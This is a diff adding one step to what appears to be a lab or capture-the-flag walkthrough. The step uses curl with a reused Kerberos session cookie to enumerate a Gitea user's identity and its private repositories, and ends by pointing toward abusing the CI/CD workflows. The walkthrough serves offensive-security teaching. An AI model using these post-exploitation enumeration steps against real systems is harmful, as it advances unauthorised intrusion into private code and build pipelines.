@@ -2381,7 +2381,82 @@ Gitea's SSPI authentication source works in exactly this way and, importantly, *
 <br>
 </div>
 
-### 
+### 3.16 — Enumerate Gitea identity and accessible repositories
+
+An authenticated session exists. Establish which account the Kerberos ticket maps to, what privileges it holds, and which repositories are reachable.
+
+**Commands:**
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
+```
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
+  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`-b /tmp/gitea_cookies.txt`|**Read** cookies from the jar|Reuse the session already established (`-c` writes, `-b` reads)|
+|`/api/v1/user`|Gitea endpoint returning the authenticated user|"Who am I?"|
+|`python3 -m json.tool`|Pretty-print JSON|Make the response readable|
+|`/api/v1/repos/search?limit=50`|Search all repositories visible to the session|List everything this account can see|
+|`python3 -c "..."`|Extract `full_name` and `private` from each result|Reduce the response to the fields that matter|
+
+**Result:**
+
+```json
+josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
+{
+    "id": 6,
+    "login": "darkzero-ext_josh",
+    "login_name": "",
+    "source_id": 0,
+    "full_name": "",
+    "email": "ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain",
+    "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
+    "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
+    "language": "en-US",
+    "is_admin": false,
+    "last_login": "1969-12-31T16:00:00-08:00",
+    "created": "2026-05-20T13:44:57-07:00",
+    "restricted": false,
+    "active": true,
+    "prohibit_login": false,
+    "location": "",
+    "website": "",
+    "description": "",
+    "visibility": "public",
+    "followers_count": 0,
+    "following_count": 0,
+    "starred_repos_count": 0,
+    "username": "darkzero-ext_josh"
+}
+josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
+  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
+DarkZero/DarkZero-Campaigns | private: True
+```
+
+**What this gives you:** Confirmed identity within Gitea and the scope of accessible content.
+
+**Key findings:**
+
+- **The session authenticates as `darkzero-ext_josh` (user id 6).** Gitea's SSPI provider auto-provisions domain users with the naming convention `<domain-with-dots-replaced-by-hyphens>_<username>`, so `josh@darkzero.ext` becomes `darkzero-ext_josh`.
+- The account was created 2026-05-20, one day after josh's application account (3.6). Both were provisioned as part of the same onboarding.
+- `is_admin: false` and `restricted: false`. Standard privileges — no site administration, but no restrictions on normal operations such as forking, opening issues, or creating pull requests.
+- **One repository is visible: `DarkZero/DarkZero-Campaigns`, marked private.** This is the source code of the web application exploited in section 3.1. josh holds read access to a private organisation repository.
+- The email address is a generated placeholder (`<uuid>@localhost.localdomain`), confirming automatic provisioning rather than manual account creation.
+- `last_login` shows the Unix epoch, meaning the account has never completed an interactive form login. All access has been via SSPI.
+- Repository search returns only this one entry. Additional repositories may exist that josh cannot see; the result reflects visibility, not the full server contents.
+
+**Next:** Enumerate the repository's contents, with particular attention to CI/CD workflow definitions that the Actions runner on SRV01 executes.
 <div align="center">
 <br>
 <br>
